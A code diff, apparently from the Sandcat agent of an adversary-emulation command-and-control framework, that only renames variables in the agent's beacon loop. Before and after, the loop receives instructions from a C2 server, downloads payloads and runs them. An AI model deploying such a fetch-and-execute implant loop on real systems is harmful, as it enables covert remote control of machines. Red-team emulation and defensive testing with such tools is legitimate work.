@@ -50,17 +50,17 @@ func runAgent (sandcatAgent *agent.Agent, c2Config map[string]string) {
 		}
 		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
 			// Run commands and send results.
-			cmds := reflect.ValueOf(beacon["instructions"])
-			for i := 0; i < cmds.Len(); i++ {
-				marshaledCommand := cmds.Index(i).Elem().String()
-				var command map[string]interface{}
-				if err := json.Unmarshal([]byte(marshaledCommand), &command); err != nil {
+			instructions := reflect.ValueOf(beacon["instructions"])
+			for i := 0; i < instructions.Len(); i++ {
+				marshaledInstruction := instructions.Index(i).Elem().String()
+				var instruction map[string]interface{}
+				if err := json.Unmarshal([]byte(marshaledInstruction), &instruction); err != nil {
 					output.VerbosePrint(fmt.Sprintf("[-] Error unpacking command: %v", err.Error()))
 				} else {
-					output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", command["id"]))
-					droppedPayloads := sandcatAgent.DownloadPayloads(command["payloads"].([]interface{}))
-					go sandcatAgent.RunInstruction(command, droppedPayloads)
-					sandcatAgent.Sleep(command["sleep"].(float64))
+					output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", instruction["id"]))
+					droppedPayloads := sandcatAgent.DownloadPayloads(instruction["payloads"].([]interface{}))
+					go sandcatAgent.RunInstruction(instruction, droppedPayloads)
+					sandcatAgent.Sleep(instruction["sleep"].(float64))
 				}
 			}
 		} else {
